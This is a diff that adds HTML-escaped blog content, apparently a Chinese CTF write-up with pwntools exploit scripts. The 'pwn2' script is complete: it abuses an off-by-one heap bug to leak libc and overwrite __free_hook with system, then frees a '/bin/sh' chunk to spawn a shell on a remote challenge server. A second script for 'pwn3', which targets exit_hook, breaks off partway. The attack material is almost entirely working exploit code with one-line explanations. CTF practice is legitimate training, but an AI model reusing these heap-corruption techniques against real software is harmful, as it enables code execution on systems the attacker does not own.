+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;pwn2&#34;&gt;pwn2&lt;/h3&gt;
+&lt;p&gt;off by one&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;, log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
+    debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+    debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
+    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./pwn2&amp;#34;&lt;/span&gt;)
+    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/lib/x86_64-linux-gnu/libc-2.27.so&amp;#34;&lt;/span&gt;)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+	p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;113.201.14.253&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16066&lt;/span&gt;)
+	libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc-2.27.so&amp;#34;&lt;/span&gt;)
+    
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;debugf&lt;/span&gt;(b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b:
+            gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(p,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b *$rebase(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{b}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hex(b)))
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(p)
+            
+elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./pwn2&amp;#39;&lt;/span&gt;)
+
+
+ru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(x)
+sn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(x)
+rl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
+sl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(x)
+rv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(x)
+sa &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; a,b : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(a,b)
+sla &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; a,b : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(a, b)
+
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;(i):
+	ru(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Choice: &amp;#34;&lt;/span&gt;)
+	sl(str(i))
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(size, content):
+	menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+	sla(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;size: &amp;#34;&lt;/span&gt;, str(size))
+	sa(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;content: &amp;#34;&lt;/span&gt;, content)
+    
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;(idx,content):
+	menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+	sla(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;idx: &amp;#34;&lt;/span&gt;, str(idx))
+	sla(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;content: &amp;#34;&lt;/span&gt;, content)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;free&lt;/span&gt;(idx):
+	menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
+	sla(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;idx: &amp;#34;&lt;/span&gt;, str(idx))
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(idx):
+	menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
+	sla(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;idx: &amp;#34;&lt;/span&gt;, str(idx))
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
+	add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
+	free(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;i)
+
+free(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xb1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+free(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xa0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1f&lt;/span&gt;)
+show(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x7f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__malloc_hook&amp;#34;&lt;/span&gt;]
+print(hex(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address))
+
+edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__free_hook&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__malloc_hook&amp;#34;&lt;/span&gt;]))
+
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;):
+	add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+
+
+free(&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;)
+
+edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__free_hook&amp;#34;&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ddd&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+add(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sym[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+free(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;pwn3&#34;&gt;pwn3&lt;/h3&gt;
+&lt;p&gt;随便玩玩拿到puts地址，写exit_hook拿shell&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;debug&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
+    debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+    debug &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
+    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./Gpwn3&amp;#34;&lt;/span&gt;)
+    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;113.201.14.253&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16033&lt;/span&gt;)
+    libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/lib/x86_64-linux-gnu/libc.so.6&amp;#39;&lt;/span&gt;)
+
+ru &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(x)
+sn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(x)
+rl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
+sl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(x)
+rv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(x)
+sa &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; a,b : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(a,b)
+sla &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; a,b : p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(a, b)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;debugf&lt;/span&gt;(b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b:
+            gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(p,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b *&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{b}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hex(b)))
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+            gdb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;attach(p)
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;menu&lt;/span&gt;(i):
+    sla(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;choice:&amp;#39;&lt;/span&gt;, str(i))
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;(c):
+    menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+    sa(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;, c)
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;up&lt;/span&gt;(c):
+    menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
+    sa(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;, c)
+
+create(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;)
+&lt;span style=&#34;color:#75715e&#34;&gt;# up(b&amp;#39;\x01&amp;#39;*34+b&amp;#39;\x00&amp;#39;)&lt;/span&gt;
+up(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
+up(p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;2147483647&lt;/span&gt;))
+menu(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
+ru(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;reward:&amp;#39;&lt;/span&gt;)
